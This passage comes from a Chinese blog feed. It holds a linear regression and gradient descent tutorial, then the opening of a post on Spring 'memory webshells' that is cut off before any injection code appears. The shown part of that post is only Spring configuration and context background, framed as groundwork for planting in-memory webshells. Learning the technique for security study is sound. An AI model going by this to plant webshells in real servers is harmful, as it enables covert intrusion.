        <content type="html"><![CDATA[<h1 id="线性回归（Linear-Regression）"><a href="#线性回归（Linear-Regression）" class="headerlink" title="线性回归（Linear Regression）"></a>线性回归（Linear Regression）</h1><p>机器学习中的两大类问题：回归问题和分类问题</p><blockquote><p>回归问题就是进行预测，如股票、房价预测<br>分类问题就是将多个事物进行分类</p></blockquote><p>线性回归是一种用于预测连续数值输出的监督学习算法，它通过建立一个线性方程来描述输入变量与输出变量之间的关系。该算法的目标是使预测值与真实值之间的差异最小化。</p><p><a name="u4Zwx"></a></p><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>线性回归是通过<strong>一个或多个自变量与因变量</strong>之间进行建模的回归分析，其特点为一个或多个称为回归系数的模型参数的线性组合。样本点为历史数据，<strong>回归曲线要能最贴切的模拟样本点的趋势，将误差降到最小</strong>。</p><p><a name="Inoua"></a></p><h3 id="线性回归方程"><a href="#线性回归方程" class="headerlink" title="线性回归方程"></a>线性回归方程</h3><p> 线形回归方程，就是有 <strong>n</strong> 个特征，然后每个特征 **Xi **都有相应的系数 **Wi **，并且在所有特征值为0的情况下，目标值有一个默认值 **W0 **，因此：<br><img src="/img/3-13/1.svg"><br><strong>整合后的公式为</strong>：</p><img src="/img/3-13/2.svg"><p><a name="ETAVk"></a></p><h2 id="损失函数"><a href="#损失函数" class="headerlink" title="损失函数"></a>损失函数</h2><p><a name="NmYVp"></a></p><h3 id="公式"><a href="#公式" class="headerlink" title="公式"></a>公式</h3><p> 损失函数是一个贯穿整个机器学习的一个重要概念，大部分机器学习算法都有误差，我们需要通过显性的公式来描述这个误差，并将这个误差优化到最小值。<br><strong>误差项</strong>：<br><img src="/img/3-13/3.svg"><br>用来表示真实值和预测值之间的差异</p><p>假设现在<strong>真实的值</strong>为 <strong>y</strong>，<strong>预测的值</strong>为 <strong>h</strong> ,损失函数为：<br><img src="/img/3-13/4.svg"></p><blockquote><p>其实机器学习在算法大思想下，关键是如何迭代调整参数能使得误差变小，<br>一般情况下算法最后推出的数学公式也是无法直接计算求解</p></blockquote><p>上面损失函数也就是所有误差和的平方。损失函数值越小，说明误差越小，这个损失函数也称<strong>最小二乘法</strong>。</p><p><a name="lXo7T"></a></p><h3 id="公式推导"><a href="#公式推导" class="headerlink" title="公式推导"></a>公式推导</h3><p><strong>前提假设：</strong>误差<img src="/img/3-13/5.svg">是独立并具有相同的分布，并且服从均值为0，方差为<img src="/img/3-13/6.svg">的高斯分布</p><p>独立同分布（independent and identically distributed，i.i.d.）：<br>在概率统计理论中，指随机过程中，任何时刻的取值都为随机变量，如果这些随机变量服从同一分布，并且互相独立，那么这些随机变量是独立同分布。</p><p>高斯分布：<br>即正态分布，概率密度函数如下如下：<br><img src="/img/3-13/7.svg"><br>这里就是取μ为0，即<br><img src="/img/3-13/8.svg"><br>将误差项计算公式,带入概率密度公式得到，预测准确的概率：<br><img src="/img/3-13/9.svg"></p><p>由于是多个样本，每个样本都是上面概率公式，这里就非常适合使用极大似然法，目标是求取一组W参数向量，使得概率取最大值<br>即求函数极值点<br>极大似然就不多说了，复习概率论就行</p><p>似然函数：<br><img src="/img/3-13/10.svg"><br>对似然函数取对数，将乘法转为加法</p><p>将上面得到式子化简得到：<br><img src="/img/3-13/11.svg"></p><p>求最大值转化为求下面的最小值<br><img src="/img/3-13/12.svg"></p><p><a name="n13p4"></a></p><h3 id="特殊解"><a href="#特殊解" class="headerlink" title="特殊解"></a>特殊解</h3><p>目标函数：<br><img src="/img/3-13/13.svg"></p><p>化简：其中<br><img src="/img/3-13/14.png"></p><p>一般都不能直接算，因为这里只是特殊解，要求<img src="/img/3-13/15.svg">要有逆元</p><p><a name="Q5JgW"></a></p><h2 id="梯度下降"><a href="#梯度下降" class="headerlink" title="梯度下降"></a>梯度下降</h2><p><img src="/img/3-13/16.png"><br> </p><blockquote><p>上面最小二乘法无法直接求解，但可以使用梯度下降算法逼近最小值</p></blockquote><p>梯度就是函数对它的各个自变量求偏导后，由偏导数组成的一个向量。</p><p>数学推导：<a href="https://dsfftp.readthedocs.io/zh-cn/latest/Linear-Regression/%E6%A2%AF%E5%BA%A6%E4%B8%8B%E9%99%8D%E6%B3%95%E7%9A%84%E6%95%B0%E5%AD%A6%E5%8E%9F%E7%90%86.html">梯度下降法的数学原理 — 数据科学：从基础到实战 version 3a0c599</a><br>大概公式就是</p><img src="/img/3-13/17.svg"><p>λ表示步长或者说是学习系数，由我们定义，更加梯度下降原理，每次向着导数的反方向移动，就会逼近最小点</p><ul><li>λ取太小，会陷入局部极值点</li><li>λ取太大，学习成本非常高</li></ul><p><a name="THeBg"></a></p><h3 id="批量梯度下降（BGD）"><a href="#批量梯度下降（BGD）" class="headerlink" title="批量梯度下降（BGD）"></a>批量梯度下降（BGD）</h3><p>批量梯度下降法（Batch Gradient Descent，简称BGD）是梯度下降法最原始的形式，它的具体思路是在更新每一参数时都使用所有的样本来进行更新。<br>我们的目的是要<strong>误差函数尽可能的小</strong>，即求解weights使误差函数尽可能小。首先，我们随机初始化weigths，然后<strong>不断反复的更新weights使得误差函数减小，</strong>直到满足要求时停止。这里更新算法我们选择梯度下降算法，利用初始化的weights并且反复更新weights：<br><img src="/img/3-13/18.png"><br>这里代表学习率，表示<strong>每次向着J最陡峭的方向迈步的大小</strong>。为了更新weights，<strong>我们需要求出函数J的偏导数。首先当我们只有一个数据点（x,y）的时候，J的偏导数是：</strong><br><img src="/img/3-13/19.png"><br>则对<strong>所有数据点，</strong>上述损失函数的偏导（<strong>累和</strong>）为：<br><img src="/img/3-13/20.png"><br>再最小化损失函数的过程中，<strong>需要不断反复的更新weights使得误差函数减小</strong>，更新过程如下：<br><img src="/img/3-13/21.png"><br>那么好了，<strong>每次参数更新的伪代码</strong>如下：<br><img src="/img/3-13/22.png"><br>由上图更新公式我们就可以看到，<strong>我们每一次的参数更新都用到了所有的训练数据</strong>（比如有m个，就用到了m个），如果训练数据非常多的话，<strong>是非常耗时的。</strong><br><strong>下面给出批梯度下降的收敛图：</strong></p><p><img src="/img/3-13/23.png"><br>从图中，我们可以得到BGD迭代的次数相对较少。<br>代码实现：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">batchGradientDescent</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> theta<span class="token punctuation">,</span> alpha<span class="token punctuation">,</span> m<span class="token punctuation">,</span> maxIteration<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>maxIteration<span class="token punctuation">)</span><span class="token punctuation">:</span>        hypothesis <span class="token operator">=</span> np<span class="token punctuation">.</span>dot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> theta<span class="token punctuation">)</span>        loss <span class="token operator">=</span> hypothesis <span class="token operator">-</span> y        gradient <span class="token operator">=</span> np<span class="token punctuation">.</span>dot<span class="token punctuation">(</span>x<span class="token punctuation">.</span>transpose<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> loss<span class="token punctuation">)</span> <span class="token operator">/</span> m        theta <span class="token operator">=</span> theta <span class="token operator">-</span> alpha <span class="token operator">*</span> gradient              <span class="token comment"># 对所有样本求和</span>    <span class="token keyword">return</span> theta</code></pre><p><a name="abTdI"></a></p><h3 id="随机梯度下降法（SGD）"><a href="#随机梯度下降法（SGD）" class="headerlink" title="随机梯度下降法（SGD）"></a>随机梯度下降法（SGD）</h3><p>由于批梯度下降每跟新一个参数的时候，要用到所有的样本数，所以训练速度会随着样本数量的增加而变得非常缓慢。随机梯度下降正是为了解决这个办法而提出的。它是利用每个样本的损失函数对θ求偏导得到对应的梯度，来更新θ：<br><img src="/img/3-13/24.png"><br>更新过程如下：<br><img src="/img/3-13/25.png"><br>随机梯度下降是通过每个样本来迭代更新一次，对比上面的批量梯度下降，迭代一次需要用到所有训练样本（<strong>往往如今真实问题训练数据都是非常巨大</strong>），一次迭代不可能最优，如果迭代10次的话就需要遍历训练样本10次。<br><strong>但是，SGD伴随的一个问题是噪音较BGD要多，使得SGD并不是每次迭代都向着整体最优化方向。</strong><br><strong>随机梯度下降收敛图如下：</strong><br><img src="/img/3-13/26.png"><br>我们可以从图中看出SGD迭代的次数较多，在解空间的搜索过程看起来很盲目。<strong>但是大体上是往着最优值方向移动。</strong><br><strong>代码实现：</strong></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">StochasticGradientDescent</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> theta<span class="token punctuation">,</span> alpha<span class="token punctuation">,</span> m<span class="token punctuation">,</span> maxIteration<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token comment"># 这里随便挑选一个进行更新点进行即可（不用想BGD一样全部考虑）</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>maxIteration<span class="token punctuation">)</span><span class="token punctuation">:</span>        hypothesis <span class="token operator">=</span> np<span class="token punctuation">.</span>dot<span class="token punctuation">(</span>x<span class="token punctuation">,</span> theta<span class="token punctuation">)</span>        loss <span class="token operator">=</span> hypothesis <span class="token operator">-</span> y  <span class="token comment"># 这里还是有十个样本</span>        index <span class="token operator">=</span> random<span class="token punctuation">.</span>sample<span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  <span class="token comment"># 随机抽取一个样本，得到它的下标</span>        gradient <span class="token operator">=</span> loss<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">*</span> x<span class="token punctuation">[</span>index<span class="token punctuation">]</span>  <span class="token comment"># 只取一个点进行更新计算</span>        theta <span class="token operator">=</span> theta <span class="token operator">-</span> alpha <span class="token operator">*</span> gradient<span class="token punctuation">.</span>T    <span class="token keyword">return</span> theta</code></pre><p><a name="Ly3Fu"></a></p><h3 id="小批量梯度下降法（MBGD）"><a href="#小批量梯度下降法（MBGD）" class="headerlink" title="小批量梯度下降法（MBGD）"></a>小批量梯度下降法（MBGD）</h3><p>我们从上面两种梯度下降法可以看出，其各自均有优缺点，那么能不能在两种方法的性能之间取得一个折衷呢？既<strong>算法的训练过程比较快，而且也要保证最终参数训练的准确率，</strong>而这正是小批量梯度下降法（Mini-batch Gradient Descent，简称MBGD）的初衷。<br>我们假设每次更新参数的时候用到的样本数为10个（<strong>不同的任务完全不同，这里举一个例子而已</strong>）<br>更新伪代码如下：<br><img src="/img/3-13/27.png"></p><p>参考：</p><ul><li><a href="https://cloud.tencent.com/developer/article/2359619">https://cloud.tencent.com/developer/article/2359619</a></li><li><a href="https://www.cnblogs.com/zongfa/p/9293887.html">https://www.cnblogs.com/zongfa/p/9293887.html</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
            <tag> 算法 </tag>
            
            <tag> 线性回归 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring内存马</title>
      <link href="/2024/03/12/Spring%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2024/03/12/Spring%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<h1 id="Spring内存马"><a href="#Spring内存马" class="headerlink" title="Spring内存马"></a>Spring内存马</h1><p>参考：</p><ul><li><a href="https://goodapple.top/archives/1355">Java安全学习——内存马 - 枫のBlog</a></li><li><a href="https://xz.aliyun.com/t/12047?time__1311=mqmhBKD50KAIKiqGNDQbiQ5SYrhnmqAxGOeD&amp;alichlgref=https://cn.bing.com/">Spring内存马——Controller/Interceptor构造 - 先知社区</a></li><li><a href="https://blog.csdn.net/mole_exp/article/details/123992395">Java内存马-SpringMVC篇_”expected lookuppath in request attribute \“org.sp-CSDN博客</a></li></ul><blockquote><p>在学习spring内存马的时候，最好知道spring、springmvc、springboot的开发知识和基本使用，下面就不多介绍基础的开发知识</p></blockquote><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>依赖</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token generics"><span class="token punctuation">&lt;</span>dependency<span class="token punctuation">&gt;</span></span>          <span class="token generics"><span class="token punctuation">&lt;</span>groupId<span class="token punctuation">&gt;</span></span>org<span class="token punctuation">.</span>springframework<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">&gt;</span>          <span class="token generics"><span class="token punctuation">&lt;</span>artifactId<span class="token punctuation">&gt;</span></span>spring<span class="token operator">-</span>context<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">&gt;</span>          <span class="token generics"><span class="token punctuation">&lt;</span>version<span class="token punctuation">&gt;</span></span><span class="token number">6.1</span><span class="token number">.4</span><span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">&gt;</span>      <span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">&gt;</span>      <span class="token generics"><span class="token punctuation">&lt;</span>dependency<span class="token punctuation">&gt;</span></span>          <span class="token generics"><span class="token punctuation">&lt;</span>groupId<span class="token punctuation">&gt;</span></span>org<span class="token punctuation">.</span>springframework<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">&gt;</span>          <span class="token generics"><span class="token punctuation">&lt;</span>artifactId<span class="token punctuation">&gt;</span></span>spring<span class="token operator">-</span>webmvc<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">&gt;</span>          <span class="token generics"><span class="token punctuation">&lt;</span>version<span class="token punctuation">&gt;</span></span><span class="token number">6.1</span><span class="token number">.4</span><span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">&gt;</span>      <span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">&gt;</span></code></pre><h3 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h3><p>Spring是利用注解、反射和模板等技术实现的一种框架。其核心类是继承于HttpServlet的DispatchServlet。那既然是Servlet，那负责的肯定就是逻辑处理部分了，那么就需要Tomcat这样的服务器来给Spring提供运行环境。<br>普遍的spring配置文件:</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>web-app</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;a href=<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">http:</span></span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">www.w3.org</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">2001</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">XMLSchema-instance"</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nofollow<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>http://www.w3.org/2001/XMLSchema-instance"  xmlns="http://java.sun.com/xml/ns/javaee"  xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd"  version="2.5"&gt;  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>display-name</span><span class="token punctuation">&gt;</span></span>HelloSpringMVC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>display-name</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>context-param</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">&gt;</span></span>contextConfigLocation<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">&gt;</span></span>/WEB-INF/applicationContext.xml<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>context-param</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>listener</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>listener-class</span><span class="token punctuation">&gt;</span></span>org.springframework.web.context.ContextLoaderListener<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>listener-class</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>listener</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">&gt;</span></span>dispatcherServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">&gt;</span></span>org.springframework.web.servlet.DispatcherServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">&gt;</span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">&gt;</span></span>contextConfigLocation<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">&gt;</span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">&gt;</span></span>/WEB-INF/dispatcherServlet-servlet.xml<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>load-on-startup</span><span class="token punctuation">&gt;</span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>load-on-startup</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">&gt;</span></span>dispatcherServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">&gt;</span></span>/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>web-app</span><span class="token punctuation">&gt;</span></span></code></pre><h4 id="ApplicationContext"><a href="#ApplicationContext" class="headerlink" title="ApplicationContext"></a>ApplicationContext</h4><p>在Spring里，BeanFactory是IoC容器的实际代表，而ApplicationContext正好继承了BeanFactory，所以org.springframework.context.ApplicationContext接口也代表了IoC容器，一旦获得了ApplicationContext实例，也即获得了IoC容器的引用。<br>这是BeanFactory与ApplicationContext的区别：</p><blockquote><p>BeanFactory的实现是按需创建，即第一次获取Bean时才创建这个Bean，而ApplicationContext会一次性创建所有的Bean</p></blockquote><p>我们可以从ApplicationContext中可以根据Bean的ID获取Bean。<br><img src="/img/3-12/1.png"><br>因此，org.springframework.context.ApplicationContext接口也代表了 IoC容器 ，它负责实例化、定位、配置应用程序中的对象(bean)及建立这些对象间(beans)的依赖。</p><h4 id="Root-Context和Child-Context"><a href="#Root-Context和Child-Context" class="headerlink" title="Root Context和Child Context"></a>Root Context和Child Context</h4><p>我们来看看web.xml配置文件</p><pre class="language-markup" data-language="markup"><code class="language-markup">...  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">&gt;</span></span>spring<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">&gt;</span></span>org.springframework.web.servlet.DispatcherServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">&gt;</span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">&gt;</span></span>contextConfigLocation<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">&gt;</span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">&gt;</span></span>/WEB-INF/springmvc.xml<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>load-on-startup</span><span class="token punctuation">&gt;</span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>load-on-startup</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">&gt;</span></span>spring<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">&gt;</span></span>/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">&gt;</span></span>...</code></pre><p>这里我们将DispatcherServlet设置别名为spring，然后将contextConfigLocation 参数值配置为/WEB-INF/springmvc.xml。</p><p>依照规范，当没有显式配置 contextConfigLocation 时，程序会自动寻找 `/WEB-INF/<servlet-name>-servlet.xml，作为配置文件。因为上面的 <servlet-name> 是 dispatcherServlet，所以当没有显式配置时，程序依然会自动找到 /WEB-INF/dispatcherServlet-servlet.xml 配置文件。</servlet-name></servlet-name></p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>beans</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans<span class="token punctuation">"</span></span>  <span class="token attr-name"><span class="token namespace">xmlns:</span>mvc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/mvc<span class="token punctuation">"</span></span>  <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>  <span class="token attr-name"><span class="token namespace">xmlns:</span>context</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/context<span class="token punctuation">"</span></span>  <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans  http://www.springframework.org/schema/beans/spring-beans.xsd  http://www.springframework.org/schema/mvc  http://www.springframework.org/schema/mvc/spring-mvc.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">mvc:</span>annotation-driven</span><span class="token punctuation">/&gt;</span></span>  <span class="token comment">&lt;!-- 1.使用注解，扫描项目中的包 --&gt;</span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">context:</span>component-scan</span> <span class="token attr-name">base-package</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.yyjccc.memorytrojan.Spring<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">context:</span>component-scan</span><span class="token punctuation">&gt;</span></span>  <span class="token comment">&lt;!-- 2.开启注解 --&gt;</span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">mvc:</span>annotation-driven</span><span class="token punctuation">/&gt;</span></span>  <span class="token comment">&lt;!-- 3.配置例外：不是让所有的代码都走springmvc的过滤器 --&gt;</span>  <span class="token comment">&lt;!-- 配置静态资源，不被DispatcherServlet处理 --&gt;</span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">mvc:</span>resources</span> <span class="token attr-name">location</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/images/<span class="token punctuation">"</span></span> <span class="token attr-name">mapping</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/images/**<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">mvc:</span>resources</span> <span class="token attr-name">location</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/js/<span class="token punctuation">"</span></span> <span class="token attr-name">mapping</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/js/**<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">mvc:</span>resources</span> <span class="token attr-name">location</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/css/<span class="token punctuation">"</span></span> <span class="token attr-name">mapping</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/css/**<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>  <span class="token comment">&lt;!-- 4.定义跳转文件的前缀和后缀，视图view的配置 --&gt;</span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewResolver<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>org.springframework.web.servlet.view.InternalResourceViewResolver<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>prefix<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/WEB-INF/views/<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>suffix<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>.jsp<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>beans</span><span class="token punctuation">&gt;</span></span></code></pre><p>每个具体的 DispatcherServlet 创建的是一个 Child Context，代表一个独立的 IoC 